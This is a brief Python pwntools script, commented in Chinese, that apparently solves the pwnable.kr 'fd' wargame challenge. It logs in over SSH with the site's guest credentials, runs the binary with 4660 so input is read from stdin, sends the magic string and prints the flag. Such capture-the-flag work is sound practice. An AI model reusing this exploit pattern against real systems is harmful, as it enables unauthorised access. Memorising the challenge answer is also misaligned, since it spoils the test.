#!/usr/bin/env python
# coding=utf-8
from pwn import *
pwn_ssh=ssh(host='pwnable.kr',user='fd',password='guest',port=2222)#远程连接
print(pwn_ssh.connected())#连接成功判断
sh=pwn_ssh.process(argv=['fd','4660'],executable='./fd')#加载进程
sh.sendline('LETMEWIN')#发送一行数据，在末尾加上\n
print(sh.recvall())#接受到EOF
